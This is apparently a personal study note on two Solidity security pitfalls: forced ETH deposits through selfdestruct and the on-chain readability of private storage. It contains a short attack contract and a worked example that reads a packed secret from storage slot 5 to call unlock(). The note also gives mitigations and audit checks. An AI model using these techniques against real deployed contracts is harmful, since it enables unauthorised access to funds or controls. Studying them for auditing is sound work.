---
tags: [solidity, smart-contracts, security]
---

One-line summary: two things Solidity can't actually prevent — receiving ETH, and keeping `private` data secret — and why both assumptions are dangerous to build on.

---

## Forced Ether via `selfdestruct`

A contract with no `receive()`, no `fallback()`, and no payable function looks immune to ever holding ETH. It isn't. `selfdestruct(target)` force-sends the calling contract's entire balance to `target`, bypassing `receive`/`fallback`/payable checks entirely — no code on the receiving end runs at all.

```solidity
contract Piggybank {
    // No receive(), no fallback(), no payable function.
    // Looks impossible to fund from outside.
}

contract ForceFund {
    constructor() payable {}

    function dump(address payable target) external {
        selfdestruct(target); // balance lands in Piggybank regardless
    }
}
```

> Since the Cancun hard fork (EIP-6780), `selfdestruct` only force-sends ETH in the general case — it no longer deletes the contract's code/storage unless the destruction happens in the same transaction the contract was created in. The forced-ETH-transfer behavior used in the attack above is unchanged.

**Why it matters:** any contract logic that assumes `address(this).balance` is fully under its own control is unsafe. An attacker can inflate a contract's balance at will, which breaks invariants like:

```solidity
require(address(this).balance == totalDeposits, "invariant broken");
```

> Audit checklist item: flag any contract that compares `address(this).balance` directly against an internally tracked total. Track deposits/withdrawals with internal accounting instead of trusting the live balance.

---

## `private` Storage Is Not Hidden

`private` is an **EVM execution-layer access control**, not encryption. It only stops *other contracts* from referencing the variable in their own code or calling a getter for it. Every byte of contract storage is replicated in plaintext on every full node — public blockchains require this for consensus, since every node must be able to independently verify state.

```solidity
contract Vault {
    bool public locked;       // slot 0
    bytes32 private password; // slot 1 — "private" doesn't hide this on-chain
}
```

Reading it requires no exploit, just a raw storage read against any RPC node:

```js
// bypasses the "private" keyword entirely — no contract logic involved
await web3.eth.getStorageAt(vaultAddress, 1)
```

> This isn't a bug in Ethereum — it's a direct consequence of every node holding a full copy of state. There is no way to have truly private data on a fully public, fully replicated ledger.

---

## Worked Example: Locating and Extracting a Packed `private` Value

Real targets are rarely as simple as one `private` variable in its own slot — the value is often packed alongside other fields, and the consumer of the data only needs part of it. This combines [Solidity - Data Location & Gas Model](./Solidity%20-%20Data%20Location%20%26%20Gas%20Model.md) (which slot) with the truncation rules in [Solidity - Hashing, Encoding & Type Conversion](./Solidity%20-%20Hashing%2C%20Encoding%20%26%20Type%20Conversion.md) (which bytes survive a cast).

```solidity
contract AccessPanel {
    bool public locked = true;          // slot 0
    uint256 public id = block.timestamp; // slot 1
    uint8 private a = 10;                // slot 2 ┐
    uint8 private b = 255;               // slot 2 │ packed together
    uint16 private c = 1;                // slot 2 ┘
    bytes32[3] private secrets;          // slots 3, 4, 5

    function unlock(bytes16 _key) public {
        require(_key == bytes16(secrets[2])); // only the LEFT 16 bytes of secrets[2] matter
        locked = false;
    }
}
```

Walking the layout: `locked` → slot 0, `id` → slot 1 (a full `uint256`, so it can't share), `a`/`b`/`c` pack into slot 2, then the `bytes32[3]` array occupies three consecutive slots starting at 3 — so `secrets[2]` is slot **5**.

```js
const slot5 = await web3.eth.getStorageAt(panelAddress, 5); // full bytes32 value, fully public
const key   = slot5.slice(0, 34); // "0x" + 32 hex chars = first 16 bytes — matches bytes16() truncation direction
await contract.unlock(key);
```

> The `bytes16(secrets[2])` cast keeps the leftmost 16 bytes (see truncation-direction note above) — slicing the wrong end of the hex string is the most common mistake here.

---

**Actual ways to keep on-chain secrets confidential:**

| Approach | What it does |
|---|---|
| Commit-reveal | Store `keccak256(secret)` on-chain; require the real value later to prove knowledge of it |
| Off-chain storage | Keep the sensitive data off-chain; put only a hash or proof on-chain |
| Zero-knowledge proofs | Prove a fact about a secret (e.g. "I know the password") without revealing it |
| Encrypted on-chain ciphertext | Store ciphertext on-chain, but this only moves the trust problem to off-chain key management |

> Audit finding pattern: any contract storing a password, key, or "private" secret as plaintext and relying on the `private` keyword for confidentiality is an automatic flag — this exact bug has appeared in production contracts.

---

**See also:** [Solidity - Data Location & Gas Model](./Solidity%20-%20Data%20Location%20%26%20Gas%20Model.md) · [Solidity - Hashing, Encoding & Type Conversion](./Solidity%20-%20Hashing%2C%20Encoding%20%26%20Type%20Conversion.md) · [Solidity - Payable Functions & Ether Transfer](./Solidity%20-%20Payable%20Functions%20%26%20Ether%20Transfer.md) · [Solidity - Denial of Service via External Calls](./Solidity%20-%20Denial%20of%20Service%20via%20External%20Calls.md) · [Smart Contract Security Notes MOC](./Smart%20Contract%20Security%20Notes%20MOC.md)
